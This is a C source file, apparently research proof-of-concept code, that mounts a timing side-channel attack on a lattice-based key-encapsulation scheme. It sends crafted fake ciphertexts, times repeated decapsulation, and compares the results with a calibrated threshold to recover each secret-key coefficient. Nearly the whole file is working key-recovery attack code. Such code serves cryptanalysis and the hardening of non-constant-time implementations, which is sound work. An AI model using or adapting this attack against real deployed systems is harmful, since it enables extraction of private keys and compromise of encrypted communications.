#include <stdio.h>
#include <string.h>
#include <time.h>
#include "api.h"
#include "rand.h"
#include "ecc.h"
#include "bin-lwe.h"
#include "fakeencrypt.h"

#define ITESTSAMPLES 10
#define JTESTSAMPLES 10000
#define ITESTS 10000

#define RATIO 125

int printvector(char *s, char*e)
{
	int i;
	printf("[");
	for(i=0;i<DIM_N;i++)
	{
		printf("%d, ",s[i]);
	}
	for(i=0;i<DIM_N-1;i++)
	{
		printf("%d, ",e[i]);
	}
	printf("%d ",e[DIM_N-1]);
	printf("]\n");
	return 0;
}

int find_failures()
{
	unsigned char pk[CRYPTO_PUBLICKEYBYTES];
	unsigned char sk[CRYPTO_SECRETKEYBYTES];
	unsigned char k1[CRYPTO_BYTES],k2[CRYPTO_BYTES],c[CRYPTO_CIPHERTEXTBYTES];

	clock_t start,finish;
	double time0, time1, timediff, threshold;
	int guess;
	int skbit;
	int i, j;

	
	///////////////////////////////////////////
	// run 100 times to remove cache-effects //
	///////////////////////////////////////////
	crypto_kem_keypair(pk,sk);
	crypto_kem_enc(c,k1,pk);
    for(i=0;i<1000;i++)
	{
		crypto_kem_dec(k2,c,sk);
	}



    //////////////////////
    // Get timings //
	//////////////////////	
	printf("Get some experimental timing data for reference\n");

	crypto_kem_keypair(pk,sk);
	timediff = 0;
	for(i=0; i<ITESTSAMPLES; i++)
	{	
		skbit=0;
		while (skbit==0)
		{
			crypto_kem_keypair(pk,sk);
			skbit = (signed char) sk[i];
		}

		// search for 1
		fake_enc(pk, MESSAGE_LEN, c, i, -1);
		start=clock();
		for(j=0;j<JTESTSAMPLES;j++)
		{
			crypto_kem_dec(k2,c,sk);
		}
		finish=clock();
		time1=(double)(finish-start);

		// search for -1
		fake_enc(pk, MESSAGE_LEN, c, i, 1);
		start=clock();
		for(j=0;j<JTESTSAMPLES;j++)
		{
			crypto_kem_dec(k2,c,sk);
		}
		finish=clock();
		time0=(double)(finish-start);

		timediff += skbit*(time0 - time1)/JTESTSAMPLES;
		printf("timing threshold: %f \n",skbit*(time0 - time1)/JTESTSAMPLES);
	}
	threshold = timediff/ITESTSAMPLES/2;

	printf("threshold: %f, \n",threshold);


    //////////////////////
    // Setup the challenge //
	//////////////////////

	printf("generate the secret\n");
	crypto_kem_keypair(pk,sk);

    //////////////////////
    // Start the attack //
	//////////////////////	

	printf("\nStart the attack\nFirst number is the secret bit we are looking for, \nsecond number is our guess\n");
	for(i=0; i<DIM_N; i++)
	{
		printf("coefficient %d: %d vs ",i, (char)sk[i]);

		// search for 1
		fake_enc(pk, MESSAGE_LEN, c, i, -1);
		start=clock();
		for(j=0;j<ITESTS;j++)
		{
			crypto_kem_dec(k2,c,sk);
		}
		finish=clock();
		time1=(double)(finish-start);


		// search for -1
		fake_enc(pk, MESSAGE_LEN, c, i, 1);
		start=clock();
		for(j=0;j<ITESTS;j++)
		{
			crypto_kem_dec(k2,c,sk);
		}
		finish=clock();
		time0=(double)(finish-start);

		timediff = (time0 - time1)/ITESTS;

		guess=0;
		if (timediff>threshold)
		{
			guess=1;
		}
		if (timediff<-threshold)
		{
			guess=-1;
		}

		printf("%d, ",guess);
		printf("timing: %f, \n",timediff);
		// printf("%d ", error);
	}

	return 0;
}
